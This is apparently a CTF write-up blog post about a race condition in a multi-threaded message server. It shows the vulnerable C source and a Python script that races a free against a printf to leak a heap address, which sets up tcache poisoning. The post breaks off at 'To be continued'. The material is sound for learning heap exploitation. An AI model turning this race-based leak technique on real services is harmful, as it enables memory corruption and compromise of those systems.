---
layout: post
title: "Exploitation primitives"
date: 2025-06-22 10:00:00 -0000
categories: writeup 
tags: [tcache poisoning, race condition]
---

# Race condition and tcache poisoning

Here I am sharing a very interesting challenge that involves race condition and tcache poisoning (an easy heap attack)

# Vulnerability

Let's dive right into the vulnerability of the binary file. First thing first, here are the simplified source code:

```c
void *handle_connection(void *fd) {
    FILE *in = fdopen((long)fd, "r");
    FILE *out = fdopen((long)fd, "w");
    setvbuf(in, NULL, _IONBF, 0);
    setvbuf(out, NULL, _IONBF, 1);

    fprintf(stderr, "Handling connection on FD %d\n", (int)fd);
    vuln(in, out);
    fprintf(stderr, "Closing connection on FD %d\n", (int)fd);

    close((long)fd);
    pthread_exit(0);
}

int main() {
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    int option = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &option, sizeof(option));
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(1337);
    bind(server_fd, (struct sockaddr *) &server_addr, sizeof(server_addr));
    listen(server_fd, 4096);

    while (1) {
        pthread_t thread;
        long connection_fd = accept(server_fd, NULL, NULL);
        pthread_create(&thread, NULL, handle_connection, (void *)connection_fd);
    }
}

```
the above presents a multi-threaded TCP server which allows multiple connections to it at the same time. If you do not know what a multi-threaded server is, that is ok, because I also am not very sure lol. I only know that it handles multiple threads (like processes) at the same time.

Below is the vulnerable main function that would be run in each threads. Since the original source code decompiled by ghidra is overwhelmingly complicated to read, here is a simplified version that is good enough for us to understand the vulnerability.
```c
char *messages[16] = { 0 };
int stored[16] = { 0 };

void vuln(FILE *in, FILE *out) {
    fprintf(out, "Welcome to the message server! Commands: malloc/scanf/printf/free/quit.\n");
    char input[1024];
    int idx;

    while (1)
    {
        if (fscanf(in, "%s", input) == EOF) break;
        if (strcmp(input, "quit") == 0) break;
        if (fscanf(in, "%d", &idx) == EOF) break;

        if (strcmp(input, "printf") == 0) {
            if (fprintf(out, "MESSAGE: %s\n", stored[idx] ? messages[idx] : "NONE") < 0) break;
        }
        else if (strcmp(input, "malloc") == 0) {
            if (!stored[idx]) messages[idx] = malloc(1024);
            stored[idx] = 1;
        }
        else if (strcmp(input, "scanf") == 0) {
            fscanf(in, "%1024s", stored[idx] ? messages[idx] : input);
        }
        else if (strcmp(input, "free") == 0) {
            if (stored[idx]) free(messages[idx]);
            stored[idx] = 0;
        }
        else fprintf(stderr, "INVALID COMMAND %s %#llx\n", input, *(unsigned long long*)input);
    }
}
```
Actually, if it is a single threaded process, the above function would be secure. It is only vulnerable in the context that it is a multi-threaded program. 

Why? 

because of race condition, we are able to leak a heap address, perform tcache poisoning to do arbitrary read and write.

## What is a race condition and how it matters in above program

Race condition is about processes, programs, or instructions getting mixed up in an order that allows us to perform a malicious sequence of operations

Using the above program as example:

when we run the following in terminal, each operations are supposed to run in a normal sequence
```
$ nc localhost 1337
Welcome to the message server! Commands: malloc/scanf/printf/free/quit.

malloc 0 // 0 is the index of a heap chunk, so that we can access it later 

scanf 0 AAAA // editing the chunk

free 0 // delete the chunk

printf 0 // print the content of the chunk 
```
they should be running in a sequence like:
```
malloc --> scanf --> free --> printf
```
and since we deleted the chunk before printing its content, it should output `MESSAGE: NONE`

However, if we create the following 2 loops and keeps them running **AT THE SAME TIME**:
```
# LOOP 1

malloc 0 

scanf 0 AAAA 

free 0 
```
```
# LOOP 2 

printf 0
```
Then, the ordering of the operations would differ, which we could get:
```
malloc --> scanf --> printf --> free 

malloc --> printf --> scanf --> free 

printf --> malloc --> scanf --> free

etc.
```

So that's the basic idea of race condition, so how does this help in our exploit?
Let's take a closer look into the `free` and `printf` operation

Under `free`, we have:
```
if (stored[idx]) 
	free(messages[idx]);

stored[idx] = 0;
```
We can see that it carefully checks whether `stored[idx]` is already 0 before freeing to protect against double free. And setting it to 0 after freeing to protect against use-after-free. So there are 2 operations inside `free` operation:

```
free --> stored[idx] = 0
```

and in inside of a `printf("%s", a)` function, there are also multiple various instructions, for example:
```
strlen(a) --> ?? --> ?? --> write(1, a, length)
```

Since this is a multi-threaded process, we can run two threads and thus two loops at the same time, like the example loop I mentioned above:
```
# LOOP 1

malloc 0 

scanf 0 AAAA 

free 0 
```
```
# LOOP 2 

printf 0
```

and ideally, we would like to see the a few operations mixed up in the following sequences, where `printf 0` is broken down into `strlen(a)` and `write(1, a, length)` and being mixed with free

```
strlen(a) --> free 0 --> write(1, a, length) --> stored[0] = 0
```

thus, we can bypass the protection in `free` operation and print something inside a freed chunk, likely a **heap address**. So we get a heap address with the following python exploit code that uses the idea I went through above:

```py
def leak_tcache(r1, r2):
	if os.fork() == 0: # .fork() duplicates a new process. There will be exactly two processes - child and parent running the same python script at the same time
	
	# os.fork() == 0 is the child, child does the following
		for _ in range(10000):
			r1.sendline(b"malloc 0")
			r1.sendline(b"scanf 0")
			r1.sendline(b"AAAABBBB")
			r1.sendline(b"free 0") # hope for write() of printf to go right after this
		exit(0) # kills the child
		
	# else, parent (os.fork() returns pid
	else:
		for _ in range(10000):
			r2.sendline(b"printf 0")
		os.wait() # waits for the child to finish
	output_set = set(r2.clean().splitlines())
	# .clean() gets the output
	# .splitlines() split the output by lines
	# set() gets the unique lines
	print(output_set)
	for output in output_set:
		output = output[9:]
		if output[:1] != b'\x41' and b'\x07' in output: # for bytes object, output[i] outputs integer
			result = output[:6]
			print(result)
			return u64(result.ljust(8, b'\x00'))
	return 0
```
        


# To be continued













